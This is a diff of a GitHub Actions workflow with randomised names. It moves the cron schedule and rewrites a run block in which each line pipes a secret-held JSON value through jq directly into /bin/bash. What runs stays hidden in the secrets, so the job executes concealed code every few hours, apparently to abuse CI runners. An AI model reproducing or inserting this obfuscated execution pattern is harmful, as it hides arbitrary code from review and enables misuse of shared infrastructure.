@@ -2,7 +2,7 @@ name: fengyuanchai4545
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
+    - cron: '55 5/6 * * *'
 
 jobs:
   build:
@@ -11,18 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          hpc68236: ${{ secrets.hpc68236 }}
+          bfdm12: ${{ secrets.bfdm12 }}
         run: |
-          echo $hpc68236 | jq -r .dzwr78846 | /bin/bash
-          echo $vj80 | jq -r .yfe54862 | /bin/bash
-          echo $cpeav01 | jq -r .cb8357 | /bin/bash
-          echo $jmdxp187 | jq -r .eitvh39807 | /bin/bash
-          echo $ql99681 | jq -r .b01 | /bin/bash
-          echo $l432 | jq -r .lj574 | /bin/bash
-          echo $ohoze82164 | jq -r .md41 | /bin/bash
-          echo $bkisn92 | jq -r .vrapn4236 | /bin/bash
-          echo $dq4968 | jq -r .ns110 | /bin/bash
-          echo $pwfv39343 | jq -r .hjcfu547 | /bin/bash
-          echo $or648 | jq -r .klog85699 | /bin/bash
-          echo $q038 | jq -r .epflo60 | /bin/bash
+          echo $bfdm12 | jq -r .euzw4597 | /bin/bash
+          echo $nw7847 | jq -r .n53 | /bin/bash
+          echo $f77 | jq -r .lulbu28 | /bin/bash
+          echo $bl98 | jq -r .gdf2 | /bin/bash
+          echo $lyd4697 | jq -r .x6 | /bin/bash
+          echo $szfp0 | jq -r .bvdog31 | /bin/bash
+          echo $aa8 | jq -r .kn4779 | /bin/bash
+          echo $vihf1616 | jq -r .qy5 | /bin/bash
+          echo $xqu5202 | jq -r .klyj07095 | /bin/bash
 
